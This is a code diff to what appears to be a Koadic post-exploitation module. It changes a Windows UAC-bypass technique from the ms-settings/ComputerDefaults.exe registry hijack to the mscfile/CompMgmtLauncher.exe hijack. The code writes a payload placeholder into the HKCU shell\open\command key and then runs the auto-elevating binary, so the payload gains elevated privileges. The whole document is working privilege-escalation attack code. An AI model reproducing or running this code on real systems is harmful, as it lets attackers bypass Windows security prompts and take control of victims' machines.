@@ -9,11 +9,10 @@ try
         throw e;
     }
 
-    var path = 'Software\\Classes\\ms-settings\\shell\\open\\command';
-    Koadic.registry.write(Koadic.registry.HKCU, path, 'DelegateExecute', '', Koadic.registry.STRING);
+    var path = 'Software\\Classes\\mscfile\\shell\\open\\command';
     Koadic.registry.write(Koadic.registry.HKCU, path, '', '~PAYLOAD_DATA~', Koadic.registry.STRING);
 
-    Koadic.shell.run("ComputerDefaults.exe", true);
+    Koadic.shell.run("CompMgmtLauncher.exe", true);
 
     Koadic.work.report("Completed");
 
